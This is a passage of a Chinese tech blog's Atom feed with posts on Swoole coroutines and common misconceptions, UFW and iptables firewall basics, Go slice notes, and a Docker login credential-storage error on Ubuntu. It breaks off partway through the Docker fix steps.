    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Composer" scheme="https://www.0x2beace.com/tags/Composer/"/>
    
  </entry>
  
  <entry>
    <title>Swoole 协程快速上手</title>
    <link href="https://www.0x2beace.com/swoole-coroutine-quick-start/"/>
    <id>https://www.0x2beace.com/swoole-coroutine-quick-start/</id>
    <published>2020-12-15T13:37:42.000Z</published>
    <updated>2020-12-15T13:38:38.874Z</updated>
    
    <content type="html"><![CDATA[<p>最近有幸读到 <a href="https://www.jianshu.com/u/281dc8d93b25" target="_blank" rel="noopener">daydaygo</a> 的 <a href="https://www.jianshu.com/p/745b0b3ffae7" target="_blank" rel="noopener">swoole 协程初体验</a>，一文从协程的执行的角度窥探 Swoole 的协程调度，并详细说明了为什么协程会快。</p><a id="more"></a><p>文章通俗易懂，笔者在此基础上增加了一些自己的理解，以此成文。</p><p>主要从以下两个方面来了解协程：</p><ol><li>协程的执行顺序：协程调度</li><li>协程为什么快：减少IO阻塞带来的性能优势</li></ol><h2 id="协程执行顺序"><a href="#协程执行顺序" class="headerlink" title="协程执行顺序"></a>协程执行顺序</h2><p>按照惯例，先来看一个最简单的协程代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">go(function () &#123;</span><br><span class="line">    echo &quot;1&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">echo &quot;2&quot;.PHP_EOL;</span><br><span class="line"></span><br><span class="line">go(function () &#123;</span><br><span class="line">    echo &quot;3&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在Swoole中 <code>Swoole\Coroutine::create</code> 等价于 <code>go</code> 函数（<code>Swoole\Coroutine</code> 前缀的类名可以映射为 <code>Co</code>），用于创建一个协程。</p><p>该函数接受一个回调函数作为参数，回调函数的内容就是协程需要执行的内容。</p><p>上面的代码执行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>从执行结果的角度来看，协程版的代码和传统的同步代码，看起来并无差异。但协程的实际执行过程却是：</p><ol><li>运行上面那段协程代码，生成一个<strong>新进程</strong></li><li>当代码执行到<code>go()</code>部分时，会在当前协程中创建一个协程，输出<code>1</code>，协程退出</li><li>代码继续向下执行，输出 <code>2</code></li><li>再次遇到<code>go()</code>函数，输出<code>3</code></li><li>协程退出，进程退出，执行完成</li></ol><h2 id="协程调度"><a href="#协程调度" class="headerlink" title="协程调度"></a>协程调度</h2><p><code>\Co::sleep()</code> 函数和<code>sleep()</code>函数差不多，但是它模拟的是 IO 等待。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">go(function () &#123;</span><br><span class="line">  &#x2F;&#x2F; 只新增了一行代码</span><br><span class="line">Co::sleep(1);</span><br><span class="line">echo &quot;1&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">echo &quot;2&quot;.PHP_EOL;</span><br><span class="line"></span><br><span class="line">go(function () &#123;</span><br><span class="line">echo &quot;3&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>怎么不是顺序执行的了？实际执行过程：</p><ol><li>运行上面那段协程代码，生成一个<strong>新进程</strong></li><li>遇到 <code>go()</code>，在当前进程中创建一个协程</li><li>协程向下执行遇到<strong>IO 阻塞</strong>，协程让出控制，进入协程调度队列</li><li>进程继续向下执行，输出 <code>2</code></li><li>创建第二个协程，输出<code>3</code></li><li>第一个协程准备就绪，输出 <code>1</code></li><li>协程退出，进程退出，执行完成</li></ol><p>到这里，已经可以看到Swoole 中<strong>协程</strong>与<strong>进程</strong>的关系，以及协程调度的过程。</p><p>下面这张图可以很清晰的看到二者区别与联系：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201129093350.png" alt=""></p><h2 id="协程快在哪里？"><a href="#协程快在哪里？" class="headerlink" title="协程快在哪里？"></a>协程快在哪里？</h2><p>大家使用协程，听到最多的原因，可能就是<strong>因为协程快</strong>。那协程相比传统同步代码倒底快在哪里呢？</p><p>首先，我们来了解一下计算机中的两类任务。</p><h3 id="CPU密集型"><a href="#CPU密集型" class="headerlink" title="CPU密集型"></a>CPU密集型</h3><p>CPU 密集型也叫计算密集型， 特点是需要进行大量科学计算，比如计算圆周率、对视频进行高清解码，吃CPU。</p><h3 id="IO-密集型"><a href="#IO-密集型" class="headerlink" title="IO 密集型"></a>IO 密集型</h3><p>涉及到网络、磁盘IO的任务都是IO密集型任务，特点是不吃CPU，任务的大部分时间都在等待IO操作完成，因为IO的速度远远低于CPU和内存的速度。</p><p>其次需要了解两个概念：</p><ul><li>并行：同一时刻，同一CPU只能执行一个任务，要N个任务同时执行，就需要有多个CPU 才行。</li><li>并发：同一时刻执行N 个任务。由于CPU 任务切换速度非常快，已经快到了人类感知极限。</li></ul><p>了解了这些基础之后，对协程的能力是不是也更清晰了一些，以及协程为什么会“快”了。</p><p>因为协程仅在 IO阻塞 时才会触发调度，从而减少等待IO 操作完成的时间。</p><h2 id="协程实践"><a href="#协程实践" class="headerlink" title="协程实践"></a>协程实践</h2><p>通过对比下面三种情况，加深对协程的理解：</p><p>同步阻塞版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>单个协程版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">Co\Run(function () use ($n) &#123;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">Co::sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;);</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>多个协程版1.0（IO 密集型）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">go(function () use ($i) &#123;</span><br><span class="line"> Co::sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>通过 <code>time</code> 命令分别查看耗时时长，可以得出以下结论：</p><ul><li>传统同步阻塞：遇到 IO阻塞，等待，导致性能损失</li><li>单协程：尽管 IO阻塞引发了协程调度，但有且只有一个协程</li><li>多协程：遇到 IO阻塞 时发生调度，IO就绪时恢复运行</li></ul><p>多个协程版2.0（CPU 密集型）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">go(function () use ($i) &#123;</span><br><span class="line"> sleep(1);</span><br><span class="line"> &#x2F;&#x2F; Co::sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>只是将 <code>Co::sleep()</code> 改成了 <code>sleep()</code>，会发现总耗时时长又和传统同步阻塞差不多了，这是因为：</p><ul><li><code>sleep()</code> 可以看做是 CPU密集型任务, 不会引起协程的调度</li><li><code>Co::sleep()</code> 模拟的是 IO密集型任务, 会引发协程的调度</li></ul><p>这也是为什么, 协程适合 IO密集型 的应用，而不适合 CPU 密集型任务。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.jianshu.com/p/745b0b3ffae7" target="_blank" rel="noopener">swoole| swoole 协程初体验</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有幸读到 &lt;a href=&quot;https://www.jianshu.com/u/281dc8d93b25&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;daydaygo&lt;/a&gt; 的 &lt;a href=&quot;https://www.jianshu.com/p/745b0b3ffae7&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;swoole 协程初体验&lt;/a&gt;，一文从协程的执行的角度窥探 Swoole 的协程调度，并详细说明了为什么协程会快。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>Swoole 常见误区及问题总结</title>
    <link href="https://www.0x2beace.com/swoole-common-mistakes-and-problems-summary/"/>
    <id>https://www.0x2beace.com/swoole-common-mistakes-and-problems-summary/</id>
    <published>2020-12-14T14:12:33.000Z</published>
    <updated>2020-12-14T14:13:55.331Z</updated>
    
    <content type="html"><![CDATA[<p>随着对Swoole 的逐步了解，总结以下可能会碰到的误区：</p><a id="more"></a><ol><li>Swoole 是单线程</li><li>Swoole 异步回调模块仅可用于 CLI 命令行模式</li><li>Swoole 只有同步阻塞的客户端才可在 <code>php-fpm</code> 中使用</li><li>Swoole 重新编译安装会自动覆盖掉之前的版本 </li><li>CPU密集型任务（科学计算等）, 不会引起协程的调度; IO密集型任务（网络请求, 文件读写等）, 才会引发协程的调度</li><li><code>enable_coroutine</code> 开启协程支持之后，无需使用 <code>Co\Run</code> 创建协程</li><li>所有的<a href="https://wiki.swoole.com/#/coroutine" target="_blank" rel="noopener">协程</a>必须在<a href="https://wiki.swoole.com/#/coroutine/scheduler" target="_blank" rel="noopener">协程容器</a>里面<a href="https://wiki.swoole.com/#/coroutine/coroutine?id=create" target="_blank" rel="noopener">创建</a>，Swoole 程序启动的时候大部分情况会自动创建协程容器</li><li><code>Swoole\Coroutine</code> 前缀的类名映射为 Co。使用 <code>Co\Run</code> 方法创建协程容器，使用 <code>Coroutine::create</code> 或 <code>go</code> 方法创建协程。</li></ol><p>常见问题：</p><ul><li><a href="https://wiki.swoole.com/#/coroutine?id=%E4%BB%80%E4%B9%88%E6%98%AF%E5%8D%8F%E7%A8%8B%E5%AE%B9%E5%99%A8" target="_blank" rel="noopener">什么是协程容器？</a></li><li><a href="https://wiki.swoole.com/#/question/use?id=%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E5%85%B1%E7%94%A81%E4%B8%AAredis%E6%88%96mysql%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener">是否可以共用 1 个 Redis 或 MySQL 连接</a></li><li><a href="https://wiki.swoole.com/#/question/use?id=call-to-undefined-function-corun" target="_blank" rel="noopener">Call to undefined function Co\Run()</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;随着对Swoole 的逐步了解，总结以下可能会碰到的误区：&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>Linux ufw 快速上手</title>
    <link href="https://www.0x2beace.com/linux-ufw-quick-start/"/>
    <id>https://www.0x2beace.com/linux-ufw-quick-start/</id>
    <published>2020-12-10T13:54:58.000Z</published>
    <updated>2020-12-14T14:15:37.375Z</updated>
    
    <content type="html"><![CDATA[<p>之前已经了解了 iptables 是设置防火墙的命令行工具，但对于初学者而言，它的上手曲线太陡了。</p><a id="more"></a><p><a href="https://help.ubuntu.com/community/UFW" target="_blank" rel="noopener">UFW</a> （即简单防火墙）相较 iptables，对于初学者而言，则易于上手得多。</p><p>UFW 默认安装在Ubuntu上。如果由于某种原因已将其卸载，则可以使用如下命令进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install ufw</span><br></pre></td></tr></table></figure><p>开启 <code>IPV6</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;default&#x2F;ufw</span><br><span class="line"></span><br><span class="line">IPV6&#x3D;yes</span><br></pre></td></tr></table></figure><h2 id="查看UFW状态"><a href="#查看UFW状态" class="headerlink" title="查看UFW状态"></a>查看UFW状态</h2><p>Ubuntu 默认没有开启 UFW。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw status</span><br></pre></td></tr></table></figure><ul><li><code>inactive</code>：表示防火墙关闭状态 </li><li><code>active</code>：表示防火墙开启状态</li></ul><h2 id="开启UFW"><a href="#开启UFW" class="headerlink" title="开启UFW"></a>开启UFW</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw enable</span><br><span class="line">Command may disrupt existing ssh connections. Proceed with operation (y|n)? y</span><br><span class="line">Firewall is active and enabled on system startup</span><br></pre></td></tr></table></figure><p>初次开启 UFW 没有任何规则（如果之前已经添加过UFW 规则，则还是存在的），如需查看以开启哪些规则，同样使用<code>ufw status</code>命令。</p><h2 id="关闭UFW"><a href="#关闭UFW" class="headerlink" title="关闭UFW"></a>关闭UFW</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw disable</span><br></pre></td></tr></table></figure><h2 id="重置所有规则"><a href="#重置所有规则" class="headerlink" title="重置所有规则"></a>重置所有规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw reset</span><br></pre></td></tr></table></figure><h2 id="允许指定端口"><a href="#允许指定端口" class="headerlink" title="允许指定端口"></a>允许指定端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow http   &#x2F;&#x2F; sudo ufw allow 80</span><br></pre></td></tr></table></figure><h3 id="指定特定-IP"><a href="#指定特定-IP" class="headerlink" title="指定特定 IP"></a>指定特定 IP</h3><p>使用UFW时，还可以指定IP地址。<br>例如，如果要允许来自特定IP地址的连接，则可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow from &lt;ip_address&gt;</span><br></pre></td></tr></table></figure><p>还可以通过添加<code>to any port</code>端口号来指定允许IP地址连接的特定端口。</p><p>例如，如果要允许 <code>203.0.113.4</code> 连接到端口22（SSH），则可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow from 203.0.113.4 to any port 22</span><br></pre></td></tr></table></figure><h2 id="禁止指定端口"><a href="#禁止指定端口" class="headerlink" title="禁止指定端口"></a>禁止指定端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw deny https   &#x2F;&#x2F; sudo ufw deny 443</span><br></pre></td></tr></table></figure><h2 id="删除指定规则"><a href="#删除指定规则" class="headerlink" title="删除指定规则"></a>删除指定规则</h2><p>正式删除具体规则之前，先使用如下命令查看对应编号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw status numbered</span><br></pre></td></tr></table></figure><p>删除指定编号对应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw delete &lt;id&gt;</span><br></pre></td></tr></table></figure><h2 id="检查UFW状态和规则"><a href="#检查UFW状态和规则" class="headerlink" title="检查UFW状态和规则"></a>检查UFW状态和规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw status verbose</span><br></pre></td></tr></table></figure><h2 id="重新载入配置"><a href="#重新载入配置" class="headerlink" title="重新载入配置"></a>重新载入配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw reload</span><br></pre></td></tr></table></figure><p>注意事项⚠️：</p><ol><li>修改了某条规则之后，需要让UFW 重新加载配置，设定规则才会生效。</li><li>谨慎禁用 ssh，否则可能会导致自己也连接不上。</li><li>在启用 UFW 之前，最好检查或者重置一下规则。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04" target="_blank" rel="noopener">How To Set Up a Firewall with UFW on Ubuntu 18.04</a></li><li><a href="https://linux.cn/article-8087-1.html" target="_blank" rel="noopener">在 Ubuntu 中用 UFW 配置防火墙</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前已经了解了 iptables 是设置防火墙的命令行工具，但对于初学者而言，它的上手曲线太陡了。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="防火墙" scheme="https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
    <category term="Ubuntu" scheme="https://www.0x2beace.com/tags/Ubuntu/"/>
    
    <category term="UFW" scheme="https://www.0x2beace.com/tags/UFW/"/>
    
  </entry>
  
  <entry>
    <title>Linux iptables 常用规则整理</title>
    <link href="https://www.0x2beace.com/linux-iptables-common-rules-collation/"/>
    <id>https://www.0x2beace.com/linux-iptables-common-rules-collation/</id>
    <published>2020-12-09T13:19:00.000Z</published>
    <updated>2020-12-10T13:56:03.338Z</updated>
    
    <content type="html"><![CDATA[<p>因为手上一直管理着两台实体机（服务器），而实体机的是没有“软防”这个概念的，“硬防”规则只能自己去设定。</p><a id="more"></a><p>而Linux 原始的防火墙工具iptables 过于繁琐，上手曲线较陡，所以这篇笔记就用来整理 Linux 的 iptables 相关知识。</p><h2 id="iptables-是什么"><a href="#iptables-是什么" class="headerlink" title="iptables 是什么"></a>iptables 是什么</h2><p>我们常常会听到这样的说法：“iptables 是一个防火墙”，其实不是，它也不是一个系统服务，所以不能使用如下命令启动/停止/重启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start&#x2F;stop&#x2F;restart iptables</span><br></pre></td></tr></table></figure><p>iptables 其实只是一个命令行工具，它用来操作 netfilter 内核防火墙，所以真正应用的防火墙应该是<strong>netfilter</strong>。</p><p>当拿到一台Linux 后，iptables就在那里，默认情况下它允许所有流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iptables -L</span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br></pre></td></tr></table></figure><h2 id="允许特定端口访问"><a href="#允许特定端口访问" class="headerlink" title="允许特定端口访问"></a>允许特定端口访问</h2><p>访问过程如下：</p><ol><li>将此规则附加到输入链（-A INPUT），以便查看传入流量</li><li>检查是否为TCP（-p tcp）</li><li>如果是，检查输入是否进入端口（–dport ssh）</li><li>如果是，接受输入（-j ACCEPT）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # 允许访问22端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT    # 允许访问80端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT   # 允许访问443端口</span><br><span class="line">iptables -A FORWARD -j REJECT                    # 禁止其他未允许的规则访问</span><br></pre></td></tr></table></figure><h2 id="禁止特定端口访问"><a href="#禁止特定端口访问" class="headerlink" title="禁止特定端口访问"></a>禁止特定端口访问</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 6379 -j DROP    # 禁止6379端口传入流量</span><br></pre></td></tr></table></figure><p>如果想要屏蔽UDP流量而不是TCP流量，只需将上述规则中的 <code>tcp</code> 修改为 <code>udp</code> 即可。</p><h2 id="禁用防火墙"><a href="#禁用防火墙" class="headerlink" title="禁用防火墙"></a>禁用防火墙</h2><p>如果需要临时/永久禁用iptables 防火墙，则可以使用以下命令清除所有规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -F</span><br></pre></td></tr></table></figure><p>设置完成之后，不用重启任何服务，其防火墙规则已经刷新了（允许所有流量）。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://www.codebelief.com/article/2017/08/linux-25-useful-iptables-firewall-rules/" target="_blank" rel="noopener">25 个有用的 iptables 防火墙规则</a></li><li><a href="https://ubuntuqa.com/article/10698.html" target="_blank" rel="noopener">如何在Ubuntu上启动/停止iptables？</a></li><li><a href="https://help.ubuntu.com/community/IptablesHowTo#Configuration%20on%20startup" target="_blank" rel="noopener">IptablesHowTo</a></li><li><a href="https://wangchujiang.com/linux-command/c/iptables.html" target="_blank" rel="noopener">iptables - Linux</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为手上一直管理着两台实体机（服务器），而实体机的是没有“软防”这个概念的，“硬防”规则只能自己去设定。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="防火墙" scheme="https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
    <category term="Ubuntu" scheme="https://www.0x2beace.com/tags/Ubuntu/"/>
    
    <category term="iptables" scheme="https://www.0x2beace.com/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Go 语言学习笔记</title>
    <link href="https://www.0x2beace.com/golang-quick-start/"/>
    <id>https://www.0x2beace.com/golang-quick-start/</id>
    <published>2020-12-08T15:53:16.000Z</published>
    <updated>2020-12-09T00:16:20.213Z</updated>
    
    <content type="html"><![CDATA[<p>最近开始学习Go 语言，记录一下学习笔记，具体可以访问<a href="https://github.com/0xAiKang/go_learning_note" target="_blank" rel="noopener">Go 语言学习笔记</a></p><a id="more"></a><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>slice 的本质是一个数据结构，实现了对数组操作的封装。</p><p>go 提供了一种类似“动态数组”结构的数据类型，这种类型就是切片。</p><p>声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 语法</span><br><span class="line">var identifier []type</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 声明一个为 int64 类型的切片 </span><br><span class="line">var slice []int64</span><br></pre></td></tr></table></figure><p>初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 初始化一个 int64 类型的切片</span><br><span class="line">array &#x3D; make ([]int64, 10)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 初始化数组</span><br><span class="line">array &#x3D; [10] int64 &#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125;</span><br></pre></td></tr></table></figure><h4 id="切片常见操作"><a href="#切片常见操作" class="headerlink" title="切片常见操作"></a>切片常见操作</h4><p>对元素进行添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数组和切片存在一些区别：</p><ul><li>声明数组时，是需要指定长度，而切片不用指定长度。</li><li>初始化操作不一样。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近开始学习Go 语言，记录一下学习笔记，具体可以访问&lt;a href=&quot;https://github.com/0xAiKang/go_learning_note&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Go 语言学习笔记&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Golang" scheme="https://www.0x2beace.com/categories/Golang/"/>
    
    
    <category term="Golang" scheme="https://www.0x2beace.com/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Docker Login 登录异常</title>
    <link href="https://www.0x2beace.com/docker-Login-login-exception/"/>
    <id>https://www.0x2beace.com/docker-Login-login-exception/</id>
    <published>2020-12-06T14:51:20.000Z</published>
    <updated>2020-12-06T14:58:27.671Z</updated>
    
    <content type="html"><![CDATA[<p>今天刚好有空，把前天那个被挖矿病毒感染的容器给换一换。</p><a id="more"></a><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>使用 <code>docker login</code> 登录时，总是会提示如下信息，可是我明明输入的是正确的账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error saving credentials: error storing credentials - err: exit status 1, out: Cannot autolaunch D-Bus without X11 $DISPLAY</span><br></pre></td></tr></table></figure><p>因为我使用的并不是最新的 <code>docker-ce</code> 版，而是老版本<code>docker.io</code>，所以起初我是怀疑版本出现了不兼容的问题吗？</p><p>其实不是，这是在 Ubuntu 下使用 docker 特有的 bug ，而修复办法不需要特意去卸载 <code>docker-compose</code> ，只要 “pass” 掉验证步骤。</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>最终解决步骤如下：</p><h4 id="1-安装-gnupg2-和-pass"><a href="#1-安装-gnupg2-和-pass" class="headerlink" title="1. 安装 gnupg2 和 pass"></a>1. 安装 <code>gnupg2</code> 和 <code>pass</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gnupg2 pass</span><br></pre></td></tr></table></figure><h4 id="2-生成密钥"><a href="#2-生成密钥" class="headerlink" title="2. 生成密钥"></a>2. 生成密钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 